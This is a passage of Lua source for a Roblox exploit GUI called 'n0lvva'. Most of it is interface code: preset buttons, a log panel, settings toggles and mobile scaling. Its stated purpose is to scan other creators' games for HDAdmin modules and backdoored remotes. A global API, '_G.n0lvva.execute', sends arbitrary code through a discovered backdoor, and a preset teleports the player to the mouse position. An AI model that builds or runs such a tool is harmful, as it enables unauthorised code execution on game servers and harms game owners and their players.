    {name = "List Players", posX = 0.359, posY = 0.308, code = 'local names={};for _,p in pairs(game.Players:GetPlayers()) do table.insert(names,p.Name) end;print(table.concat(names,", "))'},
    {name = "TP to Mouse", posX = 0.581, posY = 0.308, code = 'local p=game.Players.LocalPlayer;local c=p.Character;if c then local hrp=c:FindFirstChild("HumanoidRootPart");if hrp then local m=p:GetMouse();if m then hrp.CFrame=CFrame.new(m.Hit.Position+Vector3.new(0,3,0)) end end end'},
    {name = "HDAdmin Scan", posX = 0.792, posY = 0.308, code = 'local function scanAdmin() local r={} for _,v in pairs(game:GetDescendants()) do if v:IsA("ModuleScript") and v.Name:lower():find("admin") then table.insert(r,v:GetFullName()) end end return r end print(table.concat(scanAdmin(),", "))'},
}

for _, data in ipairs(n0lvvaPresets) do
    local btn = Instance.new("TextButton")
    btn.Font = Enum.Font.SourceSans
    btn.Text = data.name
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.TextScaled = true
    btn.TextSize = 14
    btn.TextWrapped = true
    btn.AutoButtonColor = false
    btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    btn.BorderSizePixel = 0
    btn.Position = UDim2.new(data.posX, 0, data.posY, 0)
    btn.Size = UDim2.new(0, 113, 0, 42)
    btn.Name = data.name
    btn.Parent = presetsFrame

    local c = Instance.new("UICorner")
    c.CornerRadius = UDim.new(0, 6)
    c.Parent = btn

    local s = Instance.new("UIStroke")
    s.Color = Color3.fromRGB(57, 57, 57)
    s.Thickness = 1.5
    s.Parent = btn

    btn.MouseEnter:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
        btn.UIStroke.Color = Color3.fromRGB(65, 65, 65)
    end)
    btn.MouseLeave:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)
    btn.MouseButton1Down:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
        btn.UIStroke.Color = Color3.fromRGB(50, 50, 50)
    end)
    btn.MouseButton1Up:Connect(function()
        btn.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
        btn.UIStroke.Color = Color3.fromRGB(57, 57, 57)
    end)

    btn.MouseButton1Click:Connect(function()
        codeBox.Text = data.code
        executorFrame.Visible = true
        presetsFrame.Visible = false
        logsFrame.Visible = false
    end)
end

-- =====================================================
-- LOGS FRAME
-- =====================================================
local logsFrame = Instance.new("Frame")
logsFrame.BackgroundTransparency = 1
logsFrame.Position = UDim2.new(0, 0, 0.219, 0)
logsFrame.Size = UDim2.new(0, 621, 0, 275)
logsFrame.Visible = false
logsFrame.Name = "Logs"
logsFrame.Parent = mainFrame

local logScroll = Instance.new("ScrollingFrame")
logScroll.AutomaticCanvasSize = Enum.AutomaticSize.XY
logScroll.CanvasSize = UDim2.new(0, 0, 5, 0)
logScroll.ElasticBehavior = Enum.ElasticBehavior.Never
logScroll.Active = true
logScroll.BackgroundColor3 = Color3.fromRGB(36, 36, 36)
logScroll.BorderSizePixel = 0
logScroll.Position = UDim2.new(0.124, 0, 0.209, 0)
logScroll.Size = UDim2.new(0, 308, 0, 206)
logScroll.Parent = logsFrame

local logStroke = Instance.new("UIStroke")
logStroke.Color = Color3.fromRGB(57, 57, 57)
logStroke.Thickness = 1.5
logStroke.Parent = logScroll

local logLayout = Instance.new("UIListLayout")
logLayout.SortOrder = Enum.SortOrder.LayoutOrder
logLayout.Parent = logScroll

local logTemplate = Instance.new("TextLabel")
logTemplate.Font = Enum.Font.SourceSans
logTemplate.Text = ""
logTemplate.TextColor3 = Color3.fromRGB(255, 255, 255)
logTemplate.TextSize = 20
logTemplate.TextStrokeTransparency = 0
logTemplate.TextTruncate = Enum.TextTruncate.AtEnd
logTemplate.TextWrapped = true
logTemplate.TextXAlignment = Enum.TextXAlignment.Left
logTemplate.BackgroundTransparency = 1
logTemplate.BorderSizePixel = 0
logTemplate.Size = UDim2.new(0, 451, 0, 31)
logTemplate.Name = "Template"
logTemplate.Parent = logScroll

local function addLog(message)
    local label = logTemplate:Clone()
    label.Text = message
    label.Visible = true
    label.Parent = logScroll
end

LogService.MessageOut:Connect(function(message, messageType)
    addLog(message)
end)

local logTitle = Instance.new("TextLabel")
logTitle.Font = Enum.Font.SourceSans
logTitle.Text = "n0lvva Logs"
logTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
logTitle.TextScaled = true
logTitle.TextSize = 15
logTitle.TextStrokeTransparency = 0
logTitle.TextWrapped = true
logTitle.BackgroundTransparency = 1
logTitle.BorderSizePixel = 0
logTitle.Position = UDim2.new(0.122, 0, 0.086, 0)
logTitle.Size = UDim2.new(0, 309, 0, 26)
logTitle.Name = "Log"
logTitle.Parent = logsFrame

local settingsTitle = Instance.new("TextLabel")
settingsTitle.Font = Enum.Font.SourceSans
settingsTitle.Text = "Settings"
settingsTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
settingsTitle.TextScaled = true
settingsTitle.TextSize = 15
settingsTitle.TextStrokeTransparency = 0
settingsTitle.TextWrapped = true
settingsTitle.BackgroundTransparency = 1
settingsTitle.BorderSizePixel = 0
settingsTitle.Position = UDim2.new(0.638, 0, 0.098, 0)
settingsTitle.Size = UDim2.new(0, 208, 0, 26)
settingsTitle.Name = "Log"
settingsTitle.Parent = logsFrame

local toggleMode = Instance.new("TextButton")
toggleMode.Font = Enum.Font.Ubuntu
toggleMode.Text = "Scan: HDAdmin → Backdoor"
toggleMode.TextColor3 = Color3.fromRGB(255, 255, 255)
toggleMode.TextScaled = true
toggleMode.TextSize = 14
toggleMode.TextWrapped = true
toggleMode.AutoButtonColor = false
toggleMode.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
toggleMode.BorderSizePixel = 0
toggleMode.Position = UDim2.new(0.639, 0, 0.207, 0)
toggleMode.Size = UDim2.new(0, 206, 0, 51)
toggleMode.Name = "ToggleMode"
toggleMode.Parent = logsFrame

local tmCorner = Instance.new("UICorner")
tmCorner.CornerRadius = UDim.new(0, 6)
tmCorner.Parent = toggleMode

local tmStroke = Instance.new("UIStroke")
tmStroke.Color = Color3.fromRGB(57, 57, 57)
tmStroke.Thickness = 1.5
tmStroke.Parent = toggleMode

toggleMode.MouseEnter:Connect(function()
    toggleMode.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    toggleMode.UIStroke.Color = Color3.fromRGB(65, 65, 65)
end)
toggleMode.MouseLeave:Connect(function()
    toggleMode.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    toggleMode.UIStroke.Color = Color3.fromRGB(57, 57, 57)
end)

local bgToggle = Instance.new("TextButton")
bgToggle.Font = Enum.Font.Ubuntu
bgToggle.Text = "Background: Static"
bgToggle.TextColor3 = Color3.fromRGB(255, 255, 255)
bgToggle.TextScaled = true
bgToggle.TextSize = 14
bgToggle.TextWrapped = true
bgToggle.AutoButtonColor = false
bgToggle.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
bgToggle.BorderSizePixel = 0
bgToggle.Position = UDim2.new(0.639, 0, 0.418, 0)
bgToggle.Size = UDim2.new(0, 206, 0, 51)
bgToggle.Name = "BG"
bgToggle.Parent = logsFrame

local bgCorner = Instance.new("UICorner")
bgCorner.CornerRadius = UDim.new(0, 6)
bgCorner.Parent = bgToggle

local bgStroke = Instance.new("UIStroke")
bgStroke.Color = Color3.fromRGB(57, 57, 57)
bgStroke.Thickness = 1.5
bgStroke.Parent = bgToggle

bgToggle.MouseEnter:Connect(function()
    bgToggle.BackgroundColor3 = Color3.fromRGB(22, 22, 22)
    bgToggle.UIStroke.Color = Color3.fromRGB(65, 65, 65)
end)
bgToggle.MouseLeave:Connect(function()
    bgToggle.BackgroundColor3 = Color3.fromRGB(16, 16, 16)
    bgToggle.UIStroke.Color = Color3.fromRGB(57, 57, 57)
end)

local bgState = 1
bgToggle.MouseButton1Click:Connect(function()
    if bgState == 1 then
        bgState = 2
        bgToggle.Text = "Background: Modern"
        mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
    else
        bgState = 1
        bgToggle.Text = "Background: Static"
        mainFrame.BackgroundColor3 = Color3.fromRGB(12, 12, 12)
    end
end)

local versionLabel = Instance.new("TextLabel")
versionLabel.Font = Enum.Font.SourceSans
versionLabel.Text = "n0lvva v0.2.5"
versionLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
versionLabel.TextScaled = true
versionLabel.TextSize = 14
versionLabel.TextStrokeTransparency = 0
versionLabel.TextWrapped = true
versionLabel.BackgroundTransparency = 1
versionLabel.BorderSizePixel = 0
versionLabel.Interactable = false
versionLabel.Position = UDim2.new(0.634, 0, 0.800, 0)
versionLabel.Size = UDim2.new(0, 212, 0, 35)
versionLabel.Name = "Version"
versionLabel.Parent = logsFrame

-- =====================================================
-- SIDEBAR NAVIGATION
-- =====================================================
executorBtn.MouseButton1Click:Connect(function()
    executorFrame.Visible = true
    presetsFrame.Visible = false
    logsFrame.Visible = false
end)

presetsBtn.MouseButton1Click:Connect(function()
    executorFrame.Visible = false
    presetsFrame.Visible = true
    logsFrame.Visible = false
end)

logsBtn.MouseButton1Click:Connect(function()
    executorFrame.Visible = false
    presetsFrame.Visible = false
    logsFrame.Visible = true
end)

-- =====================================================
-- MOBILE SCALING
-- =====================================================
if UserInputService.TouchEnabled then
    mainFrame.Size = UDim2.new(
        mainFrame.Size.X.Scale * 0.75, mainFrame.Size.X.Offset * 0.75,
        mainFrame.Size.Y.Scale * 0.75, mainFrame.Size.Y.Offset * 0.75
    )
    for _, ui in ipairs(mainFrame:GetDescendants()) do
        if ui:IsA("GuiObject") then
            ui.Size = UDim2.new(
                ui.Size.X.Scale * 0.75, ui.Size.X.Offset * 0.75,
                ui.Size.Y.Scale * 0.75, ui.Size.Y.Offset * 0.75
            )
        end
    end
end

-- =====================================================
-- INITIAL STATE
-- =====================================================
addLog("[n0lvva] Loaded - HDAdmin scan + Backdoor detection")
addLog("[n0lvva] Click SCAN - checks HDAdmin first, then backdoors")
addLog("[n0lvva] If no backdoor found, shows 'no backdoor'")

print("[n0lvva] HDAdmin + Backdoor scanner ready.")
print("[n0lvva] Click SCAN to start.")

-- =====================================================
-- GLOBAL API
-- =====================================================
_G.n0lvva = {
    scan = findRemote,
    scanHDAdmin = scanHDAdmin,
    getStatus = function()
        if remoteEvent then return "Backdoor: " .. remoteEvent:GetFullName() end
        if remoteFunction then return "Backdoor: " .. remoteFunction:GetFullName() end
        if hdAdminData and hdAdminData.found then return "HDAdmin found (no backdoor)" end
        return "no backdoor"
    end,
    execute = function(code)
        if remoteEvent or remoteFunction then
            return fireRemoteEvent(code)
        end
        return false, "no backdoor"
    end
}
